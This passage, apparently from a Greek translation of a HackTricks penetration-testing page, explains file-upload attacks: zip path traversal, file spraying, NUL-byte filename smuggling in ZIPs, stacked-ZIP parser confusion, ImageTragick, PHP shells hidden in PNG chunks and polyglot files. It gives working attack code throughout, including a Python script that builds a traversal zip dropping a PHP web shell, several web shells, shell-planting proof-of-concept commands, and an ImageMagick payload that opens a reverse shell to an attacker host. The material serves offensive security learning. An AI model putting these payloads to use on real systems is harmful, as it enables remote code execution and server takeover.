Αν ο στόχος είναι να στοχεύσετε ένα αρχείο όπως το `/flag.txt`, θα πρέπει να δημιουργηθεί ένα symlink προς αυτό το αρχείο στο σύστημά σας. Αυτό διασφαλίζει ότι το evilarc δεν θα αντιμετωπίσει σφάλματα κατά τη λειτουργία του.

Παρακάτω φαίνεται ένα παράδειγμα κώδικα Python που χρησιμοποιείται για τη δημιουργία ενός κακόβουλου αρχείου zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Για περισσότερες λεπτομέρειες **ελέγξτε την αρχική ανάρτηση στο**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Γράφεται PHP κώδικας για να εκτελεί εντολές που περνάνε μέσω της μεταβλητής `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Δημιουργούνται πολλαπλά αρχεία και συναρμολογείται ένα zip archive που τα περιέχει.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Τα ονόματα των αρχείων μέσα στο zip τροποποιούνται με χρήση vi ή hex editor, αλλάζοντας το "xxA" σε "../" για να διασχίσουν καταλόγους.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

When a backend validates ZIP entries using PHP’s ZipArchive but extraction writes to the filesystem using raw names, you can smuggle a disallowed extension by inserting a NUL (0x00) into the filename fields. ZipArchive treats the entry name as a C‑string and truncates at the first NUL; the filesystem writes the full name, dropping everything after the NUL.

Γενική ροή:
- Ετοιμάστε ένα νόμιμο container file (π.χ. ένα έγκυρο PDF) που ενσωματώνει ένα μικρό PHP stub σε ένα stream ώστε το magic/MIME να παραμένει PDF.
- Ονομάστε το όπως `shell.php..pdf`, zip το, στη συνέχεια hex‑edit το ZIP local header και το central directory filename για να αντικαταστήσετε την πρώτη `.` μετά από `.php` με `0x00`, με αποτέλεσμα `shell.php\x00.pdf`.
- Οι validators που βασίζονται στο ZipArchive θα «δουν» `shell.php .pdf` και θα το επιτρέψουν· ο extractor γράφει το `shell.php` στον δίσκο, οδηγώντας σε RCE αν ο φάκελος ανεβάσματος είναι εκτελέσιμος.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Σημειώσεις
- Αλλάξτε και τις δύο (BOTH) εμφανίσεις του filename (local and central directory). Κάποια εργαλεία προσθέτουν επίσης ένα επιπλέον data descriptor entry – προσαρμόστε όλα τα name fields αν υπάρχουν.
- Το payload αρχείο πρέπει να περνάει ακόμα το server‑side magic/MIME sniffing. Η ενσωμάτωση του PHP σε ένα PDF stream κρατάει το header έγκυρο.
- Λειτουργεί όταν η enum/validation path και η extraction/write path διαφωνούν στον χειρισμό συμβολοσειρών.

### Στοιβαγμένα/συγκεκριμένα ZIPs (parser disagreement)

Η συγχώνευση (concatenating) δύο έγκυρων αρχείων ZIP παράγει ένα blob όπου διαφορετικοί parsers εστιάζουν σε διαφορετικές εγγραφές EOCD. Πολλά εργαλεία εντοπίζουν το τελευταίο End Of Central Directory (EOCD), ενώ κάποιες βιβλιοθήκες (π.χ. ZipArchive σε συγκεκριμένα workflows) μπορεί να κάνουν parse στο πρώτο archive που βρουν. Αν η validation απαριθμεί (enumerates) το πρώτο archive και η extraction χρησιμοποιεί άλλο εργαλείο που σέβεται το τελευταίο EOCD, ένα benign archive μπορεί να περάσει τους ελέγχους ενώ ένα malicious θα εξαχθεί.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Σχέδιο κατάχρησης
- Δημιουργήστε ένα αβλαβές αρχείο (επιτρεπόμενος τύπος, π.χ. PDF) και ένα δεύτερο αρχείο που περιέχει μια αποκλεισμένη επέκταση (π.χ. `shell.php`).
- Συνενώστε τα: `cat benign.zip evil.zip > combined.zip`.
- Αν ο server επικυρώνει με έναν parser (βλέπει benign.zip) αλλά εξάγει με άλλον (επεξεργάζεται evil.zip), το μπλοκαρισμένο αρχείο καταλήγει στη διαδρομή εξαγωγής.

## ImageTragic

Ανεβάστε αυτό το περιεχόμενο με επέκταση εικόνας για να exploit την ευπάθεια **(ImageMagick , 7.0.1-1)** (από το [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ενσωμάτωση PHP shell σε PNG

Η ενσωμάτωση ενός PHP shell στο IDAT chunk ενός αρχείου PNG μπορεί να παρακάμψει αποτελεσματικά ορισμένες λειτουργίες επεξεργασίας εικόνας. Οι συναρτήσεις `imagecopyresized` και `imagecopyresampled` του PHP-GD είναι ιδιαίτερα σχετικές σε αυτό το πλαίσιο, καθώς χρησιμοποιούνται συνήθως για την αλλαγή μεγέθους και την επαναδειγματοληψία των εικόνων, αντίστοιχα. Η ικανότητα του ενσωματωμένου PHP shell να παραμένει ανεπηρέαστο από αυτές τις λειτουργίες αποτελεί σημαντικό πλεονέκτημα για ορισμένες περιπτώσεις χρήσης.

Μια λεπτομερής διερεύνηση αυτής της τεχνικής, συμπεριλαμβανομένης της μεθοδολογίας και των πιθανών εφαρμογών, παρέχεται στο ακόλουθο άρθρο: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ο πόρος αυτός προσφέρει μια ολοκληρωμένη κατανόηση της διαδικασίας και των επιπτώσεών της.

Περισσότερες πληροφορίες σε: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Τα Polyglot files λειτουργούν ως μοναδικό εργαλείο στην ασφάλεια πληροφοριακών συστημάτων, ενεργώντας σαν χαμαιλέοντες που μπορούν να υπάρχουν νόμιμα σε πολλαπλές μορφές αρχείων ταυτόχρονα. Ένα ενδιαφέρον παράδειγμα είναι ένα [GIFAR](https://en.wikipedia.org/wiki/Gifar), ένα υβρίδιο που λειτουργεί τόσο ως GIF όσο και ως RAR αρχείο. Τέτοια αρχεία δεν περιορίζονται σε αυτό το ζευγάρι· συνδυασμοί όπως GIF και JS ή PPT και JS είναι επίσης εφικτοί.

Η βασική χρησιμότητα των polyglot files έγκειται στην ικανότητά τους να παρακάμπτουν μέτρα ασφαλείας που φιλτράρουν αρχεία βάσει τύπου. Συνήθης πρακτική σε διάφορες εφαρμογές είναι να επιτρέπονται μόνο ορισμένοι τύποι αρχείων για upload — όπως JPEG, GIF ή DOC — για να μειωθεί ο κίνδυνος από ενδεχόμενα επιβλαβή formats (π.χ., JS, PHP ή Phar αρχεία). Ωστόσο, ένα polyglot, συμμορφούμενο με τα δομικά κριτήρια πολλαπλών τύπων αρχείων, μπορεί να παρακάμψει διακριτικά αυτούς τους περιορισμούς.

Παρά την προσαρμοστικότητά τους, τα polyglots αντιμετωπίζουν περιορισμούς. Για παράδειγμα, ενώ ένα polyglot μπορεί ταυτόχρονα να ενσωματώνει ένα PHAR αρχείο (PHp ARchive) και ένα JPEG, η επιτυχία της μεταφόρτωσής του μπορεί να εξαρτάται από τις πολιτικές επεκτάσεων αρχείων της πλατφόρμας. Εάν το σύστημα είναι αυστηρό όσον αφορά τις επιτρεπόμενες επεκτάσεις, η απλή δομική δυαδικότητα ενός polyglot μπορεί να μην είναι αρκετή για να εγγυηθεί τη μεταφόρτωση.

Περισσότερες πληροφορίες σε: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Πώς να αποφύγετε τον εντοπισμό τύπων αρχείων ανεβάζοντας ένα έγκυρο JSON αρχείο ακόμη και αν δεν επιτρέπεται, πλαστοπροσωπώντας ένα PDF αρχείο (τεχνικές από **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Όσο τα magic bytes `%PDF` βρίσκονται στα πρώτα 1024 bytes, θεωρείται έγκυρο (βλ. παράδειγμα στο άρθρο)
- **`pdflib` library**: Προσθέστε ένα ψεύτικο PDF format μέσα σε ένα πεδίο του JSON ώστε η library να νομίζει ότι είναι pdf (βλ. παράδειγμα στο άρθρο)
- **`file` binary**: Μπορεί να διαβάσει μέχρι 1048576 bytes από ένα αρχείο. Δημιουργήστε ένα JSON μεγαλύτερο από αυτό ώστε να μην μπορεί να κάνει parse το περιεχόμενο ως json και στη συνέχεια μέσα στο JSON βάλτε το αρχικό μέρος ενός πραγματικού PDF και θα το θεωρήσει PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
